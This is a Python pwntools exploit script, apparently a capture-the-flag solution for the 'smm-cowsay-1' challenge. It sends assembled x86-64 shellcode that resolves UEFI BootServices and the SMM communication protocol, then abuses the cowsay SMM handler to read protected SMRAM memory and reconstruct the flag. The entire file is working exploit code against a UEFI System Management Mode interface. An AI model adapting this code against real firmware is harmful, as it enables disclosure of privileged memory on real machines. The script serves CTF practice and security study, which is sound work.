#!/usr/bin/env python3
#
# @mebeim - 2022-08-15
#

import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

HOST = 'smm-cowsay-1.chal.uiuc.tf'
PORT = 1337
ARCH = 'amd64'
context(arch=ARCH)

def connect(prev_conn=None, quiet=False):
	if quiet:
		prev_log_level = context.log_level
		context.log_level = 'ERROR'

	if prev_conn is not None:
		prev_conn.close()

	if args.REMOTE:
		r = remote(HOST, PORT)
	else:
		os.chdir('handout/run')
		r = process('./run.sh')
		os.chdir('../..')

	if quiet:
		context.log_level = prev_log_level

	return r


gEfiSmmCommunicationProtocolGuid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2
gEfiSmmCowsayCommunicationGuid = 0xf79265547535a8b54d102c839a75cf12
EfiRuntimeServicesData = 6

conn = connect()
conn.recvuntil(b'Address of SystemTable: ')
system_table = int(conn.recvline(), 16)
log.info('SystemTable @ 0x%x', system_table)

code = asm(f'''
mov rax, {system_table}
mov rax, qword ptr [rax + 96]  /* SystemTable->BootServices */
mov rbx, qword ptr [rax + 64]  /* BootServices->AllocatePool */
mov rcx, qword ptr [rax + 320] /* BootServices->LocateProtocol */
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RBX: 0x')
AllocatePool = int(conn.recvn(16), 16)
conn.recvuntil(b'RCX: 0x')
LocateProtocol = int(conn.recvn(16), 16)

log.success('BootServices->AllocatePool   @ 0x%x', AllocatePool)
log.success('BootServices->LocateProtocol @ 0x%x', LocateProtocol)


code = asm(f'''
	/* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &protocol) */
	lea rcx, qword ptr [rip + guid]
	xor rdx, rdx
	lea r8, qword ptr [rip + protocol]
	mov rax, {LocateProtocol}
	call rax

	test rax, rax
	jnz fail

	mov rax, qword ptr [rip + protocol] /* mSmmCommunication */
	mov rbx, qword ptr [rax]            /* mSmmCommunication->Communicate */
	ret

fail:
	ud2

guid:
	.octa {gEfiSmmCommunicationProtocolGuid}
protocol:
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RAX: 0x')
mSmmCommunication = int(conn.recvn(16), 16)
conn.recvuntil(b'RBX: 0x')
Communicate = int(conn.recvn(16), 16)

log.success('mSmmCommunication              @ 0x%x', mSmmCommunication)
log.success('mSmmCommunication->Communicate @ 0x%x', Communicate)

code = asm(f'''
	/* AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer) */
	mov rcx, {EfiRuntimeServicesData}
	mov rdx, 0x1000
	lea r8, qword ptr [rip + buffer]
	mov rax, {AllocatePool}
	call rax

	test rax, rax
	jnz fail

	mov rax, qword ptr [rip + buffer]
	ret

fail:
	ud2

buffer:
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RAX: 0x')
buffer = int(conn.recvn(16), 16)

log.success('Allocated buffer @ 0x%x', buffer)

# First half of the flag
code = asm(f'''
	/* Copy data into allocated buffer */
	lea rsi, qword ptr [rip + data]
	mov rdi, {buffer}
	mov rcx, 0x20
	cld
	rep movsb

	/* Communicate(mSmmCommunication, buffer, NULL) */
	mov rcx, {mSmmCommunication}
	mov rdx, {buffer}
	xor r8, r8
	mov rax, {Communicate}
	call rax

	test rax, rax
	jnz fail
	ret

fail:
	ud2

data:
	.octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
	.quad 8                                /* Buffer->MessageLength */
	.quad 0x44440000                       /* Buffer->Data */
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'< ')
flag_half1 = conn.recvuntil(b' ').decode()

# Second half of the flag
code = asm(f'''
	/* Buffer->Data++ */
	inc qword ptr [{buffer} + 0x18]

	/* Communicate(mSmmCommunication, buffer, NULL) */
	mov rcx, {mSmmCommunication}
	mov rdx, {buffer}
	xor r8, r8
	mov rax, {Communicate}
	call rax

	test rax, rax
	jnz fail
	ret

fail:
	ud2
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'< ')
flag_half2 = conn.recvuntil(b' ').decode()

flag = ''
for a, b in zip(flag_half1, flag_half2):
	flag += a + b

print(flag)
